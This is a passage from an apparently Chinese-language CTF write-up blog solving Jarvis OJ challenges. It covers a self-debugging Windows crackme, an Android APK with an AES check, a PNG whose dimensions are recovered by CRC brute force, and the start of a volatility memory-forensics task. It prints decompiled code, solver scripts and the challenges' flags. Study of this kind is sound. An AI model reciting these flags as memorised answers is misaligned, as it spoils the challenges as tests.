&amp;Context);</span><br><span class="line">v22 = <span class="number">0x148A4690</span>;</span><br><span class="line">v23 = <span class="number">0xF14300E</span>;</span><br><span class="line">v24 = <span class="number">0x75C83B41</span>;</span><br><span class="line">v25 = <span class="number">0xF5</span>u;</span><br><span class="line">WriteProcessMemory(ProcessInformation.hProcess, (LPVOID)(Context.Eip - <span class="number">1</span>), &amp;v22, <span class="number">13u</span>, &amp;NumberOfBytesWritten);</span><br><span class="line">ContinueDebugEvent(ProcessInformation.dwProcessId, ProcessInformation.dwThreadId, DBG_CONTINUE);</span><br><span class="line">WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">LOWORD(ck1) = <span class="number">0</span>;</span><br><span class="line">ReadProcessMemory(</span><br><span class="line">  ProcessInformation.hProcess,</span><br><span class="line">  DebugEvent.u.CreateThread.hThread,</span><br><span class="line">  &amp;ck1,</span><br><span class="line">  DebugEvent.u.DebugString.nDebugStringLength,</span><br><span class="line">  &amp;NumberOfBytesRead);</span><br><span class="line"><span class="keyword">if</span> ( ck1 != <span class="number">0x2B5C5C25</span> || ck2 != <span class="number">0x36195D2F</span> || ck3 != <span class="number">0x7672642C</span> )</span><br><span class="line">  result = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  result = -(ck4 != <span class="number">0x524E6680</span>);</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
<p>给自己加命令行参数，启动自身并调试自己。</p>
<p>子程序运行到int3断点后执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v22 = 0x148A4690;</span><br><span class="line">v23 = 0xF14300E;</span><br><span class="line">v24 = 0x75C83B41;</span><br><span class="line">v25 = 0xF5u;</span><br><span class="line">WriteProcessMemory(ProcessInformation.hProcess, (LPVOID)(Context.Eip - 1), &amp;v22, 13u, &amp;NumberOfBytesWritten);</span><br></pre></td></tr></table></figure>
<p>patch完ida重新载入，main的函数可以建立了，</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">WideCharToMultiByte(<span class="number">0</span>, <span class="number">0</span>, (LPCWSTR)argv[<span class="number">1</span>], <span class="number">-1</span>, input, (<span class="keyword">signed</span> <span class="keyword">int</span>)&amp;v5[-v6] &gt;&gt; <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">len_input = <span class="built_in">strlen</span>(input);</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">tbl = s + <span class="number">1</span>;                                <span class="comment">// Welcome to CFF test!</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  input[i] ^= tbl[i];</span><br><span class="line">  ++i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( i != len_input );</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  ++input[j++];</span><br><span class="line"><span class="keyword">while</span> ( j != len_input );</span><br></pre></td></tr></table></figure>
<p>检测在父程序中。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ck1 != <span class="number">0x2B5C5C25</span> || ck2 != <span class="number">0x36195D2F</span> || ck3 != <span class="number">0x7672642C</span> )</span><br><span class="line">  result = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  result = -(ck4 != <span class="number">0x524E6680</span>);</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">key=<span class="string">'elcome to CFF test!'</span></span><br><span class="line">check=[<span class="number">0x25</span>,<span class="number">0x5c</span>,<span class="number">0x5c</span>,<span class="number">0x2b</span>,<span class="number">0x2f</span>,<span class="number">0x5d</span>,<span class="number">0x19</span>,<span class="number">0x36</span>,<span class="number">0x2c</span>,<span class="number">0x64</span>,<span class="number">0x72</span>,<span class="number">0x76</span>,<span class="number">0x80</span>,<span class="number">0x66</span>,<span class="number">0x4e</span>,<span class="number">0x52</span>]</span><br><span class="line">out=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(check)):</span><br><span class="line">    out+=chr(ord(key[i])^(check[i]<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> out</span><br></pre></td></tr></table></figure>
<p>flag:<code>A78EC98ADC239E94</code></p>
<hr>
<h2 id="MISC-misc100"><a href="#MISC-misc100" class="headerlink" title="MISC - misc100"></a>MISC - misc100</h2><p>题目描述：</p>
<blockquote>
<p>题目来源：L-CTF</p>
</blockquote>
<blockquote>
<p><a href="https://dn.jarvisoj.com/challengefiles/easy100.apk.515049fd54a763e929a8d6cb0034f249" target="_blank" rel="noopener">easy100.apk.515049fd54a763e929a8d6cb0034f249</a></p>
</blockquote>
<p>假的misc，完全就是re。</p>
<p>先看onclick函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg5)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(MainActivity.a(<span class="keyword">this</span>.a, MainActivity.a(<span class="keyword">this</span>.a), <span class="keyword">this</span>.a.findViewById(<span class="number">2131427414</span>).getText().toString())) &#123;</span><br><span class="line">        View v0 = <span class="keyword">this</span>.a.findViewById(<span class="number">2131427412</span>);</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>.a.getApplicationContext(), <span class="string">"Congratulations!"</span>, <span class="number">1</span>).show();</span><br><span class="line">        ((TextView)v0).setText(<span class="number">2131099682</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>.a.getApplicationContext(), <span class="string">"Oh no."</span>, <span class="number">1</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也就是</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MainActivity.a(<span class="keyword">this</span>.a, MainActivity.a(<span class="keyword">this</span>.a), input)</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">p</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        InputStream v0_1 = <span class="keyword">this</span>.getResources().getAssets().open(<span class="string">"url.png"</span>);</span><br><span class="line">        <span class="keyword">int</span> v1 = v0_1.available();</span><br><span class="line">        <span class="keyword">byte</span>[] v2 = <span class="keyword">new</span> <span class="keyword">byte</span>[v1];</span><br><span class="line">        v0_1.read(v2, <span class="number">0</span>, v1);</span><br><span class="line">        <span class="keyword">byte</span>[] v0_2 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">16</span>];</span><br><span class="line">        System.arraycopy(v2, <span class="number">144</span>, v0_2, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">        <span class="keyword">this</span>.key = <span class="keyword">new</span> String(v0_2, <span class="string">"utf-8"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Exception v0) &#123;</span><br><span class="line">        v0.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数从<code>url.png</code>中取出了key<code>74 68 69 73 5F 69 73 5F 74 68 65 5F 6B 65 79 2E</code></p>
<p>然后将这key传入下面两个函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">a</span><span class="params">(String key, String input)</span> </span>&#123;  <span class="comment">// here</span></span><br><span class="line">    String key_chg = <span class="keyword">this</span>.a(key);</span><br><span class="line">    String v1 = <span class="string">""</span>;</span><br><span class="line">    a v2 = <span class="keyword">new</span> a();</span><br><span class="line">    v2.a(key_chg.getBytes());</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        key_chg = <span class="keyword">new</span> String(v2.b(input.getBytes()), <span class="string">"utf-8"</span>);<span class="comment">//AES</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Exception v0_1) &#123;</span><br><span class="line">        v0_1.printStackTrace();</span><br><span class="line">        key_chg = v1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key_chg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">a</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">    String ret;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        key.getBytes(<span class="string">"utf-8"</span>);</span><br><span class="line">        StringBuilder v1 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; key.length(); i += <span class="number">2</span>) &#123;</span><br><span class="line">            v1.append(key.charAt(i + <span class="number">1</span>));</span><br><span class="line">            v1.append(key.charAt(i));  <span class="comment">// 两比特互换</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ret = v1.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(UnsupportedEncodingException v0) &#123;</span><br><span class="line">        v0.printStackTrace();</span><br><span class="line">        ret = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>途中又经过了某个AES加密函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> SecretKeySpec a;</span><br><span class="line">    <span class="keyword">private</span> Cipher b;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">(<span class="keyword">byte</span>[] arg4)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(arg4 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            goto label_15;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.a = <span class="keyword">new</span> SecretKeySpec(MessageDigest.getInstance(<span class="string">"MD5"</span>).digest(<span class="string">""</span>.getBytes(<span class="string">"utf-8"</span>)), <span class="string">"AES"</span>);</span><br><span class="line">            <span class="keyword">this</span>.b = Cipher.getInstance(<span class="string">"AES/ECB/PKCS5Padding"</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        label_15:</span><br><span class="line">            <span class="keyword">this</span>.a = <span class="keyword">new</span> SecretKeySpec(arg4, <span class="string">"AES"</span>);</span><br><span class="line">            <span class="keyword">this</span>.b = Cipher.getInstance(<span class="string">"AES/ECB/PKCS5Padding"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(UnsupportedEncodingException v0) &#123;</span><br><span class="line">            v0.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(NoSuchAlgorithmException v0_1) &#123;</span><br><span class="line">            v0_1.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(NoSuchPaddingException v0_2) &#123;</span><br><span class="line">            v0_2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">byte</span>[] b(<span class="keyword">byte</span>[] arg4) &#123;</span><br><span class="line">        <span class="keyword">this</span>.b.init(<span class="number">1</span>, <span class="keyword">this</span>.a);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.b.doFinal(arg4);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解密脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5  </span><br><span class="line"></span><br><span class="line">out = [<span class="number">21</span>, <span class="number">-93</span>, <span class="number">-68</span>, <span class="number">-94</span>, <span class="number">86</span>, <span class="number">117</span>, <span class="number">-19</span>, <span class="number">-68</span>, <span class="number">-92</span>, <span class="number">33</span>, <span class="number">50</span>, <span class="number">118</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">-15</span>, <span class="number">-13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">103</span>, <span class="number">-18</span>, <span class="number">81</span>, <span class="number">30</span>, <span class="number">68</span>, <span class="number">54</span>, <span class="number">-93</span>, <span class="number">44</span>, <span class="number">-23</span>, <span class="number">93</span>, <span class="number">98</span>, <span class="number">5</span>, <span class="number">59</span>]</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">key_raw=<span class="string">'746869735F69735F7468655F6B65792E'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">key=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(out)):</span><br><span class="line">    <span class="keyword">if</span> out[i]&lt;<span class="number">0</span>:</span><br><span class="line">        out[i]+=<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(out)):</span><br><span class="line">    flag+=chr(out[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(key_raw)/<span class="number">2</span>):</span><br><span class="line">    key+=key_raw[<span class="number">2</span>*i+<span class="number">1</span>]</span><br><span class="line">    key+=key_raw[<span class="number">2</span>*i]</span><br><span class="line"></span><br><span class="line"><span class="comment">#key = md5(key).hexdigest().decode('hex')</span></span><br><span class="line">cryptor = AES.new(key,AES.MODE_ECB,<span class="string">'\x00'</span>*<span class="number">8</span>)</span><br><span class="line">plain = cryptor.decrypt(flag)</span><br><span class="line"><span class="keyword">print</span> plain</span><br></pre></td></tr></table></figure></p>
<p>flag:<code>LCTF{1t&#39;s_rea1ly_an_ea3y_ap4}</code></p>
<hr>
<h2 id="MISC-炫酷的战队logo"><a href="#MISC-炫酷的战队logo" class="headerlink" title="MISC - 炫酷的战队logo"></a>MISC - 炫酷的战队logo</h2><p>题目描述：</p>
<blockquote>
<p>欣赏过了实验室logo，有人觉得我们战队logo直接盗图比较丑，于是我就重新设计了一个，大家再欣赏下？</p>
</blockquote>
<blockquote>
<p><a href="https://dn.jarvisoj.com/challengefiles/phrack.bmp.197c0ac62c8128bc4405a27eca3021b6" target="_blank" rel="noopener">phrack.bmp.197c0ac62c8128bc4405a27eca3021b6</a></p>
</blockquote>
<p>隐写题，下载下来是一张BMP，但是头部被抹掉了。</p>
<p>bmp头：<code>42 4D DE AB 0C</code></p>
<p>发现bmp没什么特别的。</p>
<p>尾部有一张png。但直接是打不开的。</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_077bf75336d67a11fc6882fcd36c9007.png" alt=""></p>
<p>可以看到，图片大小被修改了。</p>
<p>现在我们指望他CRC没有修改，不然就只能穷举size后肉眼一张张看了orz。</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_6be1252b2b58b57b42691ee5e40ae831.png" alt=""></p>
<p>红色的为struct的大小，此处为0xD，黑色为struct的内容，橙色是CRC校验，CRC只对黑色一块进行校验，因此可以爆破。</p>
<p>python：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">burp_crc</span><span class="params">(check)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> range(<span class="number">0x500</span>):</span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> range(<span class="number">0x500</span>):</span><br><span class="line">            a=(<span class="string">'494844520000'</span>+hex(w)[<span class="number">2</span>:].rjust(<span class="number">4</span>,<span class="string">'0'</span>)+<span class="string">'0000'</span>+hex(h)[<span class="number">2</span>:].rjust(<span class="number">4</span>,<span class="string">'0'</span>)+<span class="string">'0802000000'</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">            <span class="keyword">if</span> (binascii.crc32(a) &amp; <span class="number">0xffffffff</span>) == check:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'%d*%d'</span> % (w,h)</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">burp_crc(<span class="number">0xF37A5E12</span>)</span><br><span class="line"><span class="comment">#450*450</span></span><br></pre></td></tr></table></figure>
<p>得到正确大小<code>450*450</code></p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_52b21232a183fe29f7e96d09c42c3842.png" alt=""></p>
<p>flag:<code>PCTF{CrC32_i5_Useful_iN_pNG}</code></p>
<hr>
<h2 id="MISC-取证2"><a href="#MISC-取证2" class="headerlink" title="MISC - 取证2"></a>MISC - 取证2</h2><p>题目描述：</p>
<blockquote>
<p>还记得取证那题吗？既然有了取证神器，这里有一个可疑文件以及该存储该文件电脑的一个内存快照，那么接下来我们实战一下吧。</p>
</blockquote>
<blockquote>
<p>由于文件比较大，请大家至百度云盘下载：</p>
</blockquote>
<blockquote>
<p>链接: <a href="http://pan.baidu.com/s/1c2BIGLE" target="_blank" rel="noopener">http://pan.baidu.com/s/1c2BIGLE</a> 密码: 9v2z</p>
</blockquote>
<p>我是第一次做取证的题目，算是从头开始爬了一遍23333</p>
<p>首先安装取证神器<code>volatility</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install volatility</span><br></pre></td></tr></table></figure>
<p>-h查看说明（因为不会用）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.5</span><br><span class="line">Usage: Volatility - A memory forensics analysis platform.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -h, --help            list all available options and their default values.</span><br><span class="line">                        Default values may be set in the configuration file</span><br><span class="line">                        (/etc/volatilityrc)</span><br><span class="line">  --conf-file=/home/veritas/.volatilityrc</span><br><span class="line">                        User based configuration file</span><br><span class="line">  -d, --debug           Debug volatility</span><br><span class="line">  --plugins=PLUGINS     Additional plugin directories to use (colon separated)</span><br><span class="line">  --info                Print information about all registered objects</span><br><span class="line">  --cache-directory=/home/veritas/.cache/volatility</span><br><span class="line">                        Directory where cache files are stored</span><br><span class="line">  --cache               Use caching</span><br><span class="line">  --tz=TZ               Sets the (Olson) timezone for displaying timestamps</span><br><span class="line">                        using pytz (if installed) or tzset</span><br><span class="line">  -f FILENAME, --filename=FILENAME</span><br><span class="line">                        Filename to use when opening an image</span><br><span class="line">  --profile=WinXPSP2x86</span><br><span class="line">                        Name of the profile to load (use --info to see a list</span><br><span class="line">                        of supported profiles)</span><br><span class="line">  -l LOCATION, --location=LOCATION</span><br><span class="line">                        A URN location from which to load an address space</span><br><span class="line">  -w, --write           Enable write support</span><br><span class="line">  --dtb=DTB             DTB Address</span><br><span class="line">  --output=text         Output in this format (support is module specific, see</span><br><span class="line">                        the Module Output Options below)</span><br><span class="line">  --output-file=OUTPUT_FILE</span><br><span class="line">                        Write output in this file</span><br><span class="line">  -v, --verbose         Verbose information</span><br><span class="line">  --shift=SHIFT         Mac KASLR shift address</span><br><span class="line">  -g KDBG, --kdbg=KDBG  Specify a KDBG virtual address (Note: for 64-bit</span><br><span class="line">                        Windows 8 and above this is the address of</span><br><span class="line">                        KdCopyDataBlock)</span><br><span class="line">  --force               Force utilization of suspect profile</span><br><span class="line">  -k KPCR, --kpcr=KPCR  Specify a specific KPCR address</span><br><span class="line">  --cookie=COOKIE       Specify the address of nt!ObHeaderCookie (valid for</span><br><span class="line">                        Windows 10 only)</span><br><span class="line"></span><br><span class="line">    Supported Plugin Commands:</span><br><span class="line"></span><br><span class="line">        amcache         Print AmCache information</span><br><span class="line">        apihooks        Detect API hooks in process and kernel memory</span><br><span class="line">        atoms           Print session and window station atom tables</span><br><span class="line">        atomscan        Pool scanner for atom tables</span><br><span class="line">        auditpol        Prints out the Audit Policies from HKLM\SECURITY\Policy\PolAdtEv</span><br><span class="line">        bigpools        Dump the big page pools using BigPagePoolScanner</span><br><span class="line">        bioskbd         Reads the keyboard buffer from Real Mode memory</span><br><span class="line">        cachedump       Dumps cached domain hashes from memory</span><br><span class="line">        callbacks       Print system-wide notification routines</span><br><span class="line">        clipboard       Extract the contents of the windows clipboard</span><br><span class="line">        cmdline         Display process command-line arguments</span><br><span class="line">        cmdscan         Extract command history by scanning for _COMMAND_HISTORY</span><br><span class="line">        connections     Print list of open connections [Windows XP and 2003 Only]</span><br><span class="line">        connscan        Pool scanner for tcp connections</span><br><span class="line">        consoles        Extract command history by scanning for _CONSOLE_INFORMATION</span><br><span class="line">        crashinfo       Dump crash-dump information</span><br><span class="line">        deskscan        Poolscaner for tagDESKTOP (desktops)</span><br><span class="line">        devicetree      Show device tree</span><br><span class="line">        dlldump         Dump DLLs from a process address space</span><br><span class="line">        dlllist         Print list of loaded dlls for each process</span><br><span class="line">        driverirp       Driver IRP hook detection</span><br><span class="line">        drivermodule    Associate driver objects to kernel modules</span><br><span class="line">        driverscan      Pool scanner for driver objects</span><br><span class="line">        dumpcerts       Dump RSA private and public SSL keys</span><br><span class="line">        dumpfiles       Extract memory mapped and cached files</span><br><span class="line">        dumpregistry    Dumps registry files out to disk </span><br><span class="line">        editbox         Dumps various data from ComCtl Edit controls (experimental: ListBox, ComboBox)</span><br><span class="line">        envars          Display process environment variables</span><br><span class="line">        eventhooks      Print details on windows event hooks</span><br><span class="line">        evtlogs         Extract Windows Event Logs (XP/2003 only)</span><br><span class="line">        filescan        Pool scanner for file objects</span><br><span class="line">        gahti           Dump the USER handle type information</span><br><span class="line">        